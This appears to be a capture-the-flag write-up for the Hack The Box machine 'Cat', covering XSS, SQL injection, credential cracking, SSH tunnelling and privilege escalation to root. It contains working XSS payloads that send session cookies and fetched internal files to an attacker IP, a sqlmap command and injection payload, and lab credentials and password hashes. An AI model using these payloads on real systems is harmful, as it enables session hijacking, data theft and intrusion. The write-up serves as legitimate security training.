---
layout: post
title: "[HTB] Cat"
tags: [xss, sqli, git-dumper, sqlmap, swaks, sshtun]
difficulty: Medium
status: Work-in-Progress
updated_date: 2025-07-05
---
***

## Quick Hits:

| Info | Details |
| ---- | ------- |
| **IP Address** | 10.10.11.53 |
| **Difficulty** | 🟠 Medium |
| **Exploits** | Cross-Site Scripting, SQL Injection |
| **Tools Used** | `git-dumper`, `sqlmap`, `swaks` |
| **Techniques Used** | SSH Tunneling |
| **Interesting Files** | `/var/log/apache2/access.log` |

#### Port Scan Results:

| Port | State | Service | Version |
| ---- | ----- | ------- | ------- |
| 22/tcp | open | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open | http | Apache httpd 2.4.41 ((Ubuntu)) |

***

## Walk-through

The site is hosting a concluded best Cat contest! I'm sure if my cat was in the running, she would've crushed the competition. When I try to submit an entry for my cat, they show a confirmation that leads me to believe that they're actually reviewing the entries. Force-browsing common directories gave me a `403 Forbidden` response to the `.git` directory, so I used `git-dumper` to grab its contents. It seems that the `view_cat.php` displays submitted entries with the `username` field without sanitizing, potentially vulnerable to XSS. This page is only accessible to the site `admin`, so we can potentially obtain a privileged user for the site.

#### Cross-Site Scripting

With this in mind, I crafted an XSS payload for the `username` during registration and submitted an entry for the contest.

Username: `user001<img src=1 onerror=this.src="http://10.10.10.10/?adminCookie="+encodeURIComponent(document.cookie)>`

I hosted a listener on my machine to accept the request and got back a `PHPSESSID` from the XSS.

***Success!***

```
┌──(kali㉿kali)-[~/Desktop/Cat]
└─$ nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.174] from (UNKNOWN) [10.10.11.53] 55750
GET /?adminCookie=PHPSESSID%3D4ctn2ltttuk41vji5oe3hc6ee2 HTTP/1.1
Host: 10.10.14.174
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://cat.htb/
Priority: u=5, i
```

#### SQL Injection

Browsing the `.git` directory once more, the `accept_cat.php` page stands out. It's potentially an SQL injection vector since it uses the `catName` parameter directly in an SQL query. We can also find references to a `sqlite.db` that the pages are accessing, confirming the running database version. Passing this through `sqlmap` confirms the SQL injection vulnerability, allowing us to dump the `users` table.

```
┌──(kali㉿kali)-[~/Desktop/Cat]
└─$ sqlmap --url "http://cat.htb/accept_cat.php" --cookie="PHPSESSID=4ctn2ltttuk41vji5oe3hc6ee2" --data="catId=1&catName=Maomao" -p catName --dbms=SQLite --level=5
        ___
       __H__                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.9.2#stable}                                                                                                                    
|_ -| . [']     | .'| . |                                                                                                                                   
|___|_  ["]_|_|_|__,|  _|                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:50:53 /2025-07-02/

[12:50:55] [INFO] testing for SQL injection on POST parameter 'catName'
...
[12:51:02] [INFO] checking if the injection point on POST parameter 'catName' is a false positive
POST parameter 'catName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 80 HTTP(s) requests:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catId=1&catName=Maomao'||(SELECT CHAR(105,100,100,100) WHERE 2880=2880 AND 5104=5104)||'
---

[12:51:08] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: SQLite

[*] ending @ 12:51:08 /2025-07-02/
```

Running these through `hashcat` reveals the credentials for `rosa`:`soyunaprincesarosa`.

| user_id | email                         | password                         | username |
| ------- | ----------------------------- | -------------------------------- | -------- |
| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel     |
| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa     |
| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert   |
| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian   |
| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson |
| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry    |
| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer    |
| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter    |
| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565 | angel    |
| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad | jobert   |

We can use these credentials to login through SSH.

***And, we're in!***

#### Reconnaissance

We can use `rosa`'s access to list any passwords from `/var/log/apache2/access.log` using the command below, and we'll be given the credentials of `axel`:`aNdZwgC4tI9gnVXv_e3Q`.

```
cat /var/log/apache2/access.log | grep axel
```

We can then view his mail from `/var/mail/axel` and we're clued in to a new cat-related web service being hosted by `jobert@localhost`. They mention a Gitea repository that we can contribute to, which they will review similar to the contest entries earlier. In addition, they mention an Employee Management System hosted at `http://localhost:3000/administrator/Employee-management/` with a `README` file in `http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md`.

Looking at the running services in the machine, we can see the Gitea repository being hosted in port 3000 and a mail service running on port 25.

We can leverage `axel`'s credentials here to create an SSH tunnel from the our machine to the ports we want to access using the command below.

```
┌──(kali㉿kali)-[~/Desktop/Cat]
└─$ ssh -L 3000:localhost:3000 -L 2525:localhost:25 axel@cat.htb
axel@cat.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)
```

#### Cross-Site Scripting

Visiting the page on `http://localhost:3000`, we are greeted by a Gitea version v1.22.0 instance. This particular version contains an XSS vulnerability in the `description` field of repositories. We can create a repo (`test-repo`) and add an XSS payload in the `Description` field to grab files from the linked repo. We can do this be using the `a` tag to run JavaScript code for us that would `fetch` the file from the internal repo, but instead of the `README.md` file, we can grab `index.php`. We can send this file back to our machine by using the `fetch` command again and include the response in a request to our machine.

```
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.10.10/?content='encodeURIComponent(data)))">XSS</a>
```

We can use the mail service we tunneled earlier to send an email to `jobert@localhost` according to his instructions using the `swaks` utility shown below, making sure that we also host a listener on our machine to accept the incoming request. With this we are able to grab the contents of `index.php` which luckily contains the `valid_password` field.

```
┌──(kali㉿kali)-[~/Desktop/Cat]
└─$ swaks --to "jobert@localhost" --from "axel@localhost" --header "Test" --body "http://localhost:3000/axel/test-repo" --server localhost --port 2525
=== Trying localhost:2525...
=== Connected to localhost.
<-  220 cat.htb ESMTP Sendmail 8.15.2/8.15.2/Debian-18; Wed, 2 Jul 2025 19:27:20 GMT; (No UCE/UBE) logging access from: localhost(OK)-localhost [127.0.0.1]
 -> EHLO kali
<-  250-cat.htb Hello localhost [127.0.0.1], pleased to meet you
<-  250-ENHANCEDSTATUSCODES
<-  250-PIPELINING
<-  250-EXPN
<-  250-VERB
<-  250-8BITMIME
<-  250-SIZE
<-  250-DSN
<-  250-ETRN
<-  250-AUTH DIGEST-MD5 CRAM-MD5
<-  250-DELIVERBY
<-  250 HELP
 -> MAIL FROM:<axel@localhost>
<-  250 2.1.0 <axel@localhost>... Sender ok
 -> RCPT TO:<jobert@localhost>
<-  250 2.1.5 <jobert@localhost>... Recipient ok
 -> DATA
<-  354 Enter mail, end with "." on a line by itself
 -> Date: Wed, 02 Jul 2025 13:27:13 -0600
 -> To: jobert@localhost
 -> From: axel@localhost
 -> Subject: test Wed, 02 Jul 2025 13:27:13 -0600
 -> Message-Id: <20250702132713.038509@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> Test
 -> 
 -> http://localhost:3000/axel/test-repo
 -> 
 -> 
 -> .
<-  250 2.0.0 562JRKdG052437 Message accepted for delivery
 -> QUIT
<-  221 2.0.0 cat.htb closing connection
=== Connection closed with remote host.
```

Back to the listener we set up:

```
┌──(kali㉿kali)-[~/Tools]
└─$ python -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [02/Jul/2025 13:31:11] "GET / HTTP/1.1" 200 -
10.10.11.53 - - [02/Jul/2025 13:31:11] "GET /?content=%3C%3Fphp%0A%24valid_username%20%3D%20%27admin%27%3B%0A%24valid_password%20%3D%20%27IKw75eR0MR7CMIxhH0%27%3B%0A%0Aif%20(!isset(%24_SERVER%5B%27PHP_AUTH_USER%27%5D)%20%7C%7C%20!isset(%24_SERVER%5B%27PHP_AUTH_PW%27%5D)%20%7C%7C%20%0A%20%20%20%20%24_SERVER%5B%27PHP_AUTH_USER%27%5D%20!%3D%20%24valid_username%20%7C%7C%20%24_SERVER%5B%27PHP_AUTH_PW%27%5D%20!%3D%20%24valid_password)%20%7B%0A%20%20%20%20%0A%20%20%20%20header(%27WWW-Authenticate%3A%20Basic%20realm%3D%22Employee%20Management%22%27)%3B%0A%20%20%20%20header(%27HTTP%2F1.0%20401%20Unauthorized%27)%3B%0A%20%20%20%20exit%3B%0A%7D%0A%0Aheader(%27Location%3A%20dashboard.php%27)%3B%0Aexit%3B%0A%3F%3E%0A%0A HTTP/1.1" 200 -
```

Decoded:

```
<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
?>
```

We can try using this to switch to the `root` user using this password, **and we're done!**

```
axel@cat:/tmp$ su root
Password: 
root@cat:/tmp# cat /root/root.txt
********************************
```
